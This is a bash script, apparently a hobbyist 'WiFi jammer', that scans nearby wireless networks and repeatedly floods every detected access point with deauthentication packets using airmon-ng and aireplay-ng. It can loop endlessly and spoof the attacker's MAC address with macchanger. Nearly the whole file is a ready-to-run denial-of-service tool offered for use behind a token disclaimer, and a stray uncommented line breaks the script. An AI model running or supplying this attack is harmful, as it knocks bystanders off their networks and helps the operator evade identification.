#!/bin/bash
#T4nny -_- 
#Copying This Code Without Credits Will Open The Hell Ports For You and scratch your fireball too -_-

banner(){
printf "\e[1;77m               
o       o   O  o-O-o             o--o   O  o-O-o                 o   O  o   o o   o o--o o--o  
|       |  / \   |               |     / \   |                   |  / \ |\ /| |\ /| |    |   | 
o   o   o o---o  |       o-o     O-o  o---o  |       o-o         | o---o| O | | O | O-o  O-Oo  
 \ / \ /  |   |  |               |    |   |  |               \   o |   ||   | |   | |    |  \  
  o   o   o   oo-O-o             o    o   oo-O-o              o-o  o   oo   o o   o o--o o   o \e[0m\n"
printf "\n"
printf "\e[1;93m       .:.:.\e[0m\e[1;77m Xploiting Tool coded by:  @t4nny \e[0m\e[1;93m.:.:.\e[0m\n"
printf "\n"
printf "  \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
printf "  \e[101m\e[1;77m:: responsible for any misuse or damage caused by Wai-Fi-Jammer ::\e[0m\n"
printf "  \e[101m\e[1;77m:: Credit Goes to Stackoverflow, TheLinuxChoice ::\e[0m\n"
printf "\n"
printf "Copying This Code Without Credits Will Open The Hell Ports For You and scratch your fireball too -_- \n\n"

}             

CHANGE IT AS UR WANT

# Default name for the Wireless interface(Enter Your WLAN Interface Name)
wint="wlan0"

# decide if the program is an endless loop (1 for Endless || 0 for Once Per MAC)
endless=1

# default DeAuth times for each MAC address(No. Of Deauths Packets per MAC)
deauth_number=5



#DON't CHANGE BELOW VALUES
wint_set=0
name=jam-scan
temp_name=$(mktemp "${name}-XXX")
change_macs=0
yes_to_all=0
keep_scan_files=0
white_list= 
RED='\e[0;31m'
GREEN='\e[0;32m'
BROWN='\e[0;33m'
BOLD='\e[1m'
NC='\e[0m'
prompt="${BOLD}jam!${NC} "
#DON't CHANGE ABOVE VALUES

printlnp() {
    printf "${prompt}%s\n" "$1"
}


printred() {
    printf "${RED}%s${NC}" "$1"
}

printgreen() {
    printf "${GREEN}%s${NC}" "$1"
}

printbrown() {
    printf "${BROWN}%s${NC}" "$1"
}

printlnpr() {
    printlnp "$(printred "$1")"
}

printlnpg() {
    printlnp "$(printgreen "$1")"
}

printlnpbr() {
    printlnp "$(printbrown "$1")"
}

check_perm() {
    if [[ $EUID != 0 ]]; then
      printlnpr "Are Your Drunk "$whoami"? I need root privileges for this."
      exit 0
    fi
}

check_dep() {
    for command in airmon-ng macchanger iwlist awk; do
      if [[ -z $(which $command) ]]; then
        printlnpr "'$command' was not found"
        printlnpr "consider installing it from the repositories of your distribution"
        exit 0
      fi
    done
    printlnpg "All dependencies are met, moving on."
}

check_number() {
    local re='^[0-9]+$'
    if [[ ! ($1 =~ $re) ]]; then
        printlnpr "Wrong argument format. Exiting."
        exit 0
    fi
    return 1
}

whitelist_contains_element() {
    local seeking="$1"
    for element in "${white_list[@]}"; do
        element=$( echo "${element}" | sed -e 's/^ *//' -e 's/ *$//' );
        [[ "$element" == "$seeking" ]] && echo "found"
    done 
}

change_mac_inter() {
    if [[ $change_macs -eq 1 ]]; then
        printlnp "Changing MAC for Wireless Interface"
        ifconfig $wint down
        sleep 1
        macchanger -A $wint
        sleep 1
        ifconfig $wint up
    fi   
}

cleanup_and_reset() {
    airmon-ng stop ${wint}mon
    if [[ $change_macs -eq 1 ]]; then
        ifconfig $wint down
        sleep 1
        macchanger -p $wint
        sleep 1
        ifconfig $wint up
    fi
    if [[ keep_scan_files -eq 0 ]]; then
        printf "${prompt}Cleaning up the created files . . .\n"
        rm -f ${temp_name}
        rm -f $name-01.csv
        rm -f $name-01.cap
        rm -f $name-01.kismet.csv
        rm -f $name-01.kismet.netxml
    fi
    ifconfig "$wint" up
    service network-manager restart
    service avahi-daemon restart
    printf "${prompt}Done. Exiting.\n"
}

prepare_air() {
    if [[ $(airmon-ng check | tail -n +6 | tr [:blank:] -) ]]; then
        service network-manager stop
        service avahi-daemon stop
        airmon-ng check kill > /dev/null 2>&1
        airmon-ng check kill > /dev/null 2>&1
    fi
    airmon-ng start $wint
}

warn_about_interface() {
    if [[ "$wint_set" -eq 0 ]]; then
        printlnpbr "the default interface has not been changed"
        printlnpbr "The detected interfaces are: "
        airmon-ng | sed '/^$/d' | awk '{print $2}' | tail -n +2
        printlnpbr "The default is **$wint**"
        printlnpbr "If they do not match, cancel the scan and use -w to set it"
        #if [[ yes_to_all -eq 0 ]]; then
            #printlnpbr "Waiting 8 seconds to make up your mind"
            #sleep 8
        #fi
        printlnpbr "Continuing ..."
    fi
}

show_help() {
    echo
    echo "Usage: jammer [OPTION] ... "
    echo "Jam Wifi Networks that Your Wireless Card can Reach."
    echo
    printgreen "-d, --deauths"
    printf "\t\t: Set the number of deauthentications for each station (default ${deauth_number})\n"
    printgreen "-y, --yes"
    printf "\t\t: Make 'Yes' the answer for everything the script asks\n"
    printgreen "-s, --endless"
    printf "\t\t: When reaching the end of the list, start again\n"
    printgreen "-f, --whitelist"
    printf "\t\t: A file with ESSID's to ignore during the attack\n"
    printgreen "-k, --keep"
    printf "\t\t: Keep the scan files after the script ends\n"
    printgreen "-n, --name"
    printf "\t\t: Choose the names the scan files are saved as\n"
    printgreen "-w, --wireless"
    printf "\t\t: Set the name for the wireless interface. Default is 'wlan0'\n"
    printgreen "--spoof-mac"
    printf "\t\t: Try to change MACs using macchanger\n"
    printgreen "-h, --help"
    printf "\t\t: Show this help message\n"
    echo
    echo
}

scan_area() {
   
    if iwlist $wint scanning |
        while IFS= read -r line; do
            [[ "$line" =~ Address ]] && bssid=${line##*ss: }
            [[ "$line" =~ \(Channel ]] && { channel=${line##*nel }; channel=${channel:0:$((${#channel}-1))}; }
            [[ "$line" =~ ESSID ]] && {
                essid=${line##*ID:}
                [[ -z $(whitelist_contains_element "$essid") ]] && echo "${bssid};${channel};${essid}"
            }
        done > ${temp_name};
    then
        echo "Something went wrong, retrying"
        sleep 5
        scan_area
    fi
}

deauth() {
    local re='^[0-9]+$'
    declare essid="$1" bssid="$2" channel="$3"
    if [[ "$channel" =~ $re ]]; then
        echo -e ${prompt}Targeting:${RED} "$essid" ${NC} with BSSID: "$bssid" @ ${GREEN}Channel "$channel" ${NC}
        sleep 3
        iwconfig ${wint}mon channel "$channel"
        aireplay-ng -0 $deauth_number -a "$bssid" ${wint}mon
    fi
}

read_file_and_deauth() {
   
    while read -r line
    do
        read bssid channel essid <<< $(echo $line | awk -F";" '{print $1 " " $2 " " $3}')
        deauth "$essid" "$bssid" "$channel"
    done < ${temp_name}
}

main_attack() {
    read_file_and_deauth
    if [[ endless -eq 1 ]]; then
        main_attack
    else exit 0
    fi
}

show_detected_stations() {
    printlnp "Detected Stations are:"
    awk -F";" '{print NR,$3}' ${temp_name}
    printf "\n\n"
}

parse_options() {
  while [[ $# > 0 ]]
  do
  key="$1"
  case $key in
      -d|--deauths)
          deauth_number="$2"
          check_number $deauth_number
          printlnpg "Setting deauth number to $deauth_number"
          shift
      ;;
      --spoof-mac)
          change_macs=1
          printlnpg "I will try to change your macs"
      ;;
      -y|--yes)
          yes_to_all=1
          printlnpg "Setting YES as the answer to everything"
      ;;
      -s|--endless)
          endless=1
          printlnpg "Setting mode to Endless"
      ;;
      -f|--whitelist)
          readarray white_list < "$2"
          printlnpg "Trying to whitelist the ESSID's in the file $2"
          shift
      ;;
      -k|--keep)
          keep_scan_files=1
          printlnpg "Scan files will be kept"
      ;;
      -n|--name)
          name="$2"
          printlnpg "Setting scan file names to $name"
          shift
      ;;
      -w|--wireless)
          wint="$2"
          wint_set=1
          printlnpg "Setting wireless interface name to $wint"
          shift
      ;;
      -h|--help)
          show_help
          exit 0
      ;;
      *)
          printlnpr "Unknown option '$1'"
          show_help
          printlnpr "Exiting."
          exit 0
      ;;
  esac
  shift
  done
}

banner
parse_options "$@"
check_perm
check_dep
trap cleanup_and_reset EXIT
cd "$(dirname "$0")"
warn_about_interface
change_mac_inter

if [ ${#white_list[@]} -ne 0 ]; then
    printlnp "White-listed stations: "
    echo "${white_list[@]}" | sed -e 's/^ *//' -e 's/ *$//'
fi

printlnpg "Scanning the area for active stations"

scan_area

show_detected_stations

if [[ $yes_to_all -eq 1 ]]; then
    main_attack
    exit 0
fi
printf "${prompt}Scan is completed. Start jamming? [Y/n] "
read answer_start
case $answer_start in
        [Nn] | [Nn][Oo] )
            printf "${prompt}${RED}Aborted.\n${NC}"
            exit 0
        ;;
        *)
            prepare_air
            main_attack
            exit 0
        ;;
esac
